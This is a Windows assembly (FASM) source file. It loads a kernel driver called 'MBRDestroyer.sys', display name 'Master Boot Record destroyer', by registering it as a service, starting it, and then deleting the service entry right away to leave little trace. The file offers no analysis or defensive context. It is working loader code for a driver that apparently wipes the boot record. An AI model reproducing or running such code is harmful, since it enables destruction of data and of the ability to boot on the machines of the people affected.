include '%fasminc%\win32a.inc'
format PE GUI 4.0
entry start

;_________________________________________________________________________________________________________________________

SC_MANAGER_CREATE_SERVICE	= 0x00000002
SERVICE_START			= 0x00000010
DELETE				= 0x00010000
SERVICE_KERNEL_DRIVER		= 0x00000001
SERVICE_DEMAND_START		= 0x00000003
SERVICE_ERROR_IGNORE		= 0x00000000
MAX_PATH			= 0xFF

;_________________________________________________________________________________________________________________________

section '.code' code readable writeable executable

  start:
    invoke	OpenSCManager, NULL,NULL,SC_MANAGER_CREATE_SERVICE
    test	eax,eax
    jnz 	@f
    invoke	MessageBox, NULL,errormsg.1,NULL,MB_OK
    jmp 	finish

    @@:
    mov 	[hSCManager],eax
    invoke	GetFullPathName, lpDriverName,MAX_PATH,acDriverPath,esp
    invoke	CreateService, [hSCManager],lpServiceName,lpDisplayName,\
		SERVICE_START+DELETE,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,SERVICE_ERROR_IGNORE,\
		acDriverPath,\
		NULL,NULL,NULL,NULL,NULL
    test	eax,eax
    jnz 	@f
    invoke	MessageBox, NULL,errormsg.2,NULL,MB_OK
    invoke	CloseServiceHandle, [hSCManager]
    jmp 	finish

    @@:
    mov 	[hService],eax
    invoke	StartService, eax,NULL,NULL
    invoke	DeleteService, [hService]
    invoke	CloseServiceHandle, [hService]
    invoke	CloseServiceHandle, [hSCManager]

  finish:
    invoke	ExitProcess,0

;_________________________________________________________________________________________________________________________

section '.data' data readable writeable
  hSCManager	dd ?
  hService	dd ?

  lpDriverName	db "MBRDestroyer.sys",0
  acDriverPath	rb MAX_PATH

  lpServiceName db 'MBRDestroyer',0
  lpDisplayName db 'Master Boot Record destroyer',0

  errormsg:
	.1	db "Can't connect to Service Control Manager.",0
	.2	db "Can't register driver.",0


;_________________________________________________________________________________________________________________________

section '.idata' import readable writeable

library kernel32,'kernel32.dll',\
	advapi32,'advapi32.dll',\
	user32,'user32.dll'

include '%fasminc%\apia\kernel32.inc'
include '%fasminc%\apia\advapi32.inc'
include '%fasminc%\apia\user32.inc'